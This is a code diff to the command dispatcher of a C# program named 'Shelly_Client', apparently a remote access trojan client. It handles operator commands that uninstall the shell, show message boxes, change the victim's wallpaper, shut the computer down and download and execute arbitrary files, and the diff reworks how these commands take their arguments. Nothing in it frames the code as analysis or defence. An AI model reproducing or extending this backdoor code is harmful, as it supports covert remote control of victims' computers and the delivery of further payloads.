@@ -6,8 +6,10 @@ namespace Shelly_Client
     {
         public static void IO(string IO)
         {
+            string[] Command = IO.Split(' ');
+
             // Read data
-            switch (IO)
+            switch (Command[0])
             {
                 // Uninstall shell
                 case "uninstall":
@@ -39,15 +41,22 @@ namespace Shelly_Client
                 case "messagebox":
 
                     // Display messagebox
-                    Functions.General.MsgBox(SocketHandler.Receive());
+                    Functions.General.MsgBox(Command[1]);
                     break;
 
                 // Download and execute
                 case "downloadandexecute":
 
                     // Download file and drop to temp
-                    Functions.General.DAE(SocketHandler.Receive());
+                    Functions.General.DAE(Command[1]);
                     
+                    break;
+
+                // Download and execute
+                case "changewallpaper":
+
+                    // Change wallpaper
+                    Functions.Fun.CWP(Command[1]);
                     break;
 
                 // Shutdown computer
